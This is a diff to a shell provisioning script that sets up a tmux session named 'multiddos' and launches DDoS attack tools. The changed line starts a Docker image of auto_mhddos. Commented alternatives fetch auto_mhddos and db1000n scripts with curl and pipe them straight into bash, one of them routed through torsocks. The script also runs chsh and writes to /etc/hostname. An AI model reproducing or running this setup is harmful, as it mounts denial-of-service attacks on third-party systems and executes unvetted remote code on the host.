@@ -13,7 +13,7 @@ pip install --upgrade pip
 #sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable"
 #sudo apt install docker-ce -y
 
-# chsh -s /usr/bin/fish
+chsh -s /usr/bin/fish
 echo $HOSTNAME >> /etc/hostname
 # sudo touch /etc/cloud/cloud-init.disabled
 tmux kill-session -t multiddos; sudo pkill node
@@ -31,12 +31,13 @@ if [ ! -f "/usr/local/bin/gotop" ]; then
     sudo dpkg -i gotop.deb
 fi
 
-tmux new-session -s multiddos -d 'gotop -ac solarized'
+tmux new-session -s multiddos -d #'gotop -ac solarized'
 sleep 0.1
 tmux split-window -v 'vnstat -l'
 sleep 0.1
 #tmux split-window -v 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_bash.sh | bash -s -- 2000'
-tmux split-window -v 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/test.sh | bash'
+#tmux split-window -v 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/test.sh | bash'
+tmux split-window -v 'docker run -it --name auto_mhddos --rm --pull always ghcr.io/theorlovsky/auto_mhddos:latest'
 #sleep 0.1
 #tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
 #tmux split-window -v 'docker run --rm -it --pull always ghcr.io/arriven/db1000n'
